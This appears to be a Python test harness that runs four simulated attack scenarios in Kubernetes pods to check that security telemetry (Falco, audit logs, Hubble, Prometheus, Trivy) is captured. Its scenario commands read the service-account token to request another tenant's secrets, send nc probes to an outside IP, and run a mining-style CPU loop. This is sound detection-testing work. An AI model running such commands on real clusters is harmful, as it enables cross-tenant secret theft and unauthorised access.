"""Targeted 4-run test to verify audit cross-namespace matching, egress, and CPU gate."""

from __future__ import annotations

import json
import logging
import shutil
import socket
import subprocess
import time
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from runtimelens.collector.per_run_capture import PerRunTelemetryCapture

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("runtimelens.test_4_runs")

RUNS_DIR = Path("data/raw/runs")


def check_service_port(name: str, port: int, candidate_ips: list[str]) -> None:
    for ip in candidate_ips:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)
        try:
            sock.connect((ip, port))
            sock.close()
            return
        except Exception:
            pass
    candidates_str = ", ".join(candidate_ips)
    raise RuntimeError(
        f"PRE-RUN CHECK FAILED: {name} is NOT listening on port {port} (checked: {candidates_str})."
    )


def verify_receiver_ports_listening() -> None:
    check_service_port("Hubble Relay port-forward", 4245, ["127.0.0.1", "localhost"])
    check_service_port("Falco Webhook receiver", 8765, ["172.18.0.1", "127.0.0.1"])
    check_service_port("Audit Webhook receiver", 8766, ["172.18.0.1", "127.0.0.1"])


def get_available_ram_mb() -> float:
    try:
        out = subprocess.check_output(["free", "-m"], text=True)
        for line in out.splitlines():
            if line.startswith("Mem:"):
                return float(line.split()[6])
    except Exception:
        pass
    return 4000.0


def get_disk_use_percent() -> float:
    try:
        out = subprocess.check_output(["df", "/"], text=True)
        lines = out.splitlines()
        if len(lines) >= 2:
            return float(lines[1].split()[4].replace("%", ""))
    except Exception:
        pass
    return 20.0


def resolve_pod_name(namespace: str, app_label: str) -> str:
    cmd = [
        "kubectl",
        "get",
        "pods",
        "-n",
        namespace,
        "-l",
        f"app={app_label}",
        "-o",
        "jsonpath={.items[0].metadata.name}",
    ]
    try:
        return subprocess.check_output(cmd, text=True).strip()
    except Exception:
        return ""


def cleanup_pod(namespace: str, pod_name: str) -> None:
    clean_cmd = (
        "rm -f /tmp/ok /tmp/health_ok /tmp/*.tmp 2>/dev/null || true; "
        "pgrep -f 'while true' | xargs -r kill -9 2>/dev/null || true; "
        "pgrep -f 'nc -l' | xargs -r kill -9 2>/dev/null || true"
    )
    subprocess.run(
        ["kubectl", "exec", "-n", namespace, pod_name, "--", "/bin/sh", "-c", clean_cmd],
        capture_output=True,
        check=False,
    )


def verify_per_run_gate(run_dir: Path, is_mining: bool = False) -> tuple[bool, str]:
    counts: dict[str, int] = {}
    timestamps: list[float] = []

    # Falco
    falco_f = run_dir / "falco" / "events.jsonl"
    f_cnt = 0
    if falco_f.exists():
        with open(falco_f, encoding="utf-8") as f:
            for line in f:
                if line.strip().startswith("{"):
                    f_cnt += 1
                    ts = json.loads(line).get("time")
                    if ts:
                        timestamps.append(
                            datetime.fromisoformat(ts.replace("Z", "+00:00")).timestamp()
                        )
    counts["falco"] = f_cnt

    # Audit
    audit_f = run_dir / "audit" / "events.jsonl"
    a_cnt = 0
    if audit_f.exists():
        with open(audit_f, encoding="utf-8") as f:
            for line in f:
                if line.strip().startswith("{"):
                    a_cnt += 1
                    d = json.loads(line)
                    ts = d.get("stageTimestamp") or d.get("requestReceivedTimestamp")
                    if ts:
                        timestamps.append(
                            datetime.fromisoformat(ts.replace("Z", "+00:00")).timestamp()
                        )
    counts["audit"] = a_cnt

    # Hubble
    hubble_f = run_dir / "hubble" / "flows.jsonl"
    h_cnt = 0
    if hubble_f.exists():
        with open(hubble_f, encoding="utf-8") as f:
            for line in f:
                if line.strip().startswith("{"):
                    h_cnt += 1
                    ts = json.loads(line).get("flow", {}).get("time")
                    if ts:
                        timestamps.append(
                            datetime.fromisoformat(ts.replace("Z", "+00:00")).timestamp()
                        )
    counts["hubble"] = h_cnt

    # Prometheus
    prom_f = run_dir / "prometheus" / "metrics.json"
    p_cnt = 0
    samples: list[dict[str, Any]] = []
    if prom_f.exists():
        try:
            p_data = json.loads(prom_f.read_text(encoding="utf-8"))
            samples = p_data.get("samples", [])
            p_cnt = len(samples) if samples else len(p_data.get("pod_stats", []))
            for s in samples:
                ts = s.get("timestamp")
                if ts:
                    timestamps.append(datetime.fromisoformat(ts.replace("Z", "+00:00")).timestamp())
        except Exception:
            pass
    counts["prometheus"] = p_cnt

    # Trivy
    counts["trivy"] = 1 if (run_dir / "trivy" / "report.json").exists() else 0

    for src in ["falco", "audit", "hubble", "prometheus", "trivy"]:
        if counts[src] < 1:
            return False, f"Missing telemetry from source '{src}': count={counts[src]}"

    # Duration
    calc_dur = 0.0
    if len(timestamps) >= 2:
        calc_dur = round(max(timestamps) - min(timestamps), 2)

    if is_mining:
        if counts["prometheus"] < 8:
            return False, f"Mining cAdvisor samples insufficient: {counts['prometheus']} < 8"
        if calc_dur < 115.0:
            return False, f"Mining duration too short: {calc_dur}s < 120s"
        sample_cpus: list[float] = []
        for s in samples:
            s_cpu = 0.0
            for p in s.get("pod_stats", []):
                for c in p.get("containers", []):
                    s_cpu += float(c.get("cpu", {}).get("usageNanoCores", 0.0)) / 1e6
            sample_cpus.append(s_cpu)
        if sample_cpus:
            pct_high = sum(1 for v in sample_cpus if v >= 100.0) / len(sample_cpus) * 100.0
            if pct_high < 80.0:
                msg = f"Mining sustained CPU insufficient: {pct_high:.1f}% < 80.0% samples >= 100m"
                return False, msg

    return True, "CLEAN"


def execute_test_run(item: dict[str, Any], collector: PerRunTelemetryCapture) -> dict[str, Any]:
    run_id = item["run_id"]
    ns = item["namespace"]
    app = item["app"]
    cmd_str = item["command"]
    is_mining = item["is_mining"]
    sleep_after = item.get("sleep_after", 5)

    pod_name = resolve_pod_name(ns, app)
    if not pod_name:
        raise RuntimeError(f"Could not find running pod for {ns}/{app}")

    run_dir = collector.prepare_run_dir(run_id)

    verify_receiver_ports_listening()
    avail_mb = get_available_ram_mb()
    disk_pct = get_disk_use_percent()
    if avail_mb < 2048.0 or disk_pct >= 80.0:
        err = f"Resource breach before {run_id}: RAM avail={avail_mb}MB, Disk={disk_pct}%"
        raise RuntimeError(err)

    t0 = datetime.now(UTC)
    t0_iso = t0.isoformat().replace("+00:00", "Z")

    if not is_mining:
        collector.capture_cadvisor_metrics(pod_name, ns, run_dir)
    last_sample_wall = time.time()

    p_exec = subprocess.Popen(
        ["kubectl", "exec", "-n", ns, pod_name, "--", "/bin/sh", "-c", cmd_str],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    while p_exec.poll() is None:
        time.sleep(1.0)
        avail_mb = get_available_ram_mb()
        disk_pct = get_disk_use_percent()
        if avail_mb < 2048.0 or disk_pct >= 80.0:
            p_exec.terminate()
            cleanup_pod(ns, pod_name)
            err = f"Resource breach during {run_id}: RAM avail={avail_mb}MB, Disk={disk_pct}%"
            raise RuntimeError(err)
        if time.time() - last_sample_wall >= 10.0:
            collector.capture_cadvisor_metrics(pod_name, ns, run_dir)
            last_sample_wall = time.time()

    p_exec.wait(timeout=10)

    if sleep_after > 0:
        sleep_end = time.time() + sleep_after
        while time.time() < sleep_end:
            time.sleep(min(1.0, sleep_end - time.time()))
            if time.time() - last_sample_wall >= 10.0:
                collector.capture_cadvisor_metrics(pod_name, ns, run_dir)
                last_sample_wall = time.time()

    if time.time() - last_sample_wall >= 4.0:
        collector.capture_cadvisor_metrics(pod_name, ns, run_dir)

    t1 = datetime.now(UTC)
    t1_iso = t1.isoformat().replace("+00:00", "Z")
    elapsed = round((t1 - t0).total_seconds(), 2)

    collector.capture_falco_alerts(pod_name, ns, t0_iso, run_dir)
    collector.capture_k8s_audit_events(pod_name, ns, t0_iso, t1_iso, run_dir)
    collector.capture_hubble_flows(ns, t0_iso, t1_iso, run_dir)
    collector.attach_trivy_report(run_dir)

    collector.write_run_index(
        run_dir=run_dir,
        run_id=run_id,
        threat_class=item["class"],
        scenario_id=item["scenario_id"],
        namespace=ns,
        workload_name=app,
        pod_name=pod_name,
        t_start_iso=t0_iso,
        t_end_iso=t1_iso,
    )

    gate_ok, gate_reason = verify_per_run_gate(run_dir, is_mining=is_mining)
    if not gate_ok:
        cleanup_pod(ns, pod_name)
        raise RuntimeError(f"Per-run gate FAILED for {run_id}: {gate_reason}")

    cleanup_pod(ns, pod_name)

    backup_target = Path("data/raw_backup") / run_id
    backup_target.parent.mkdir(parents=True, exist_ok=True)
    shutil.copytree(run_dir, backup_target, dirs_exist_ok=True)

    return {
        "run_id": run_id,
        "class": item["class"],
        "scenario_id": item["scenario_id"],
        "elapsed_seconds": elapsed,
        "gate_status": "PASSED",
    }


def run_4_test_runs() -> None:
    prv_cmd = (
        "nc -z -w 1 10.96.0.10 53 || true; "
        "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true); "
        'wget -T 2 -t 1 --header="Authorization: Bearer $TOKEN" --no-check-certificate -qO- '
        "https://10.96.0.1:443/api/v1/namespaces/tenant-b/secrets 2>&1 || true; "
        "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 || true"
    )
    exf_cmd = (
        "nc -z -w 1 10.96.0.10 53 || true; "
        "nc -l -p 8888 & PID_L=$!; sleep 0.2; "
        "nc -w 1 127.0.0.1 8888 < /dev/null || true; "
        "kill $PID_L 2>/dev/null || true; "
        "echo probe | nc -u -w 1 198.51.100.22 8888 || true"
    )
    mnr_cmd = (
        "nc -l -p 3333 & PID_L=$!; sleep 0.2; "
        "nc -w 1 127.0.0.1 3333 < /dev/null || true; "
        "kill $PID_L 2>/dev/null || true; "
        "echo probe | nc -u -w 1 198.51.100.22 3333 || true; "
        "while true; do :; done & PID=$!; "
        "sleep 125; kill $PID 2>/dev/null || true"
    )
    ben_cmd = "uptime && nc -z -w 1 10.96.0.10 53 || true"

    manifest = [
        # 1. Privilege Abuse (cross-namespace token request targeting tenant-b secrets)
        {
            "run_id": "run-test-01-prv",
            "class": "privilege_abuse",
            "scenario_id": "SC-PRV-01",
            "namespace": "tenant-a",
            "app": "api",
            "command": prv_cmd,
            "sleep_after": 6,
            "is_mining": False,
        },
        # 2. Exfiltration (real TCP connect attempt on high port 8888 + UDP probe)
        {
            "run_id": "run-test-02-exf",
            "class": "exfiltration",
            "scenario_id": "SC-EXF-01",
            "namespace": "tenant-a",
            "app": "payment-style",
            "command": exf_cmd,
            "sleep_after": 6,
            "is_mining": False,
        },
        # 3. Cryptomining (real TCP connect on 3333 + 120s sustained CPU loop)
        {
            "run_id": "run-test-03-mnr",
            "class": "cryptomining",
            "scenario_id": "SC-MNR-01",
            "namespace": "tenant-a",
            "app": "web",
            "command": mnr_cmd,
            "sleep_after": 2,
            "is_mining": True,
        },
        # 4. Benign Run
        {
            "run_id": "run-test-04-ben",
            "class": "benign",
            "scenario_id": "SC-BEN-01",
            "namespace": "tenant-b",
            "app": "web",
            "command": ben_cmd,
            "sleep_after": 6,
            "is_mining": False,
        },
    ]

    verify_receiver_ports_listening()
    collector = PerRunTelemetryCapture(RUNS_DIR)
    RUNS_DIR.mkdir(parents=True, exist_ok=True)

    for item in manifest:
        logger.info("Starting test run: %s (%s)", item["run_id"], item["class"])
        res = execute_test_run(item, collector)
        logger.info(
            "Completed test run: %s in %ss [%s]",
            res["run_id"],
            res["elapsed_seconds"],
            res["gate_status"],
        )

    print("COMPLETED_4_TEST_RUNS_CLEAN")


if __name__ == "__main__":
    run_4_test_runs()
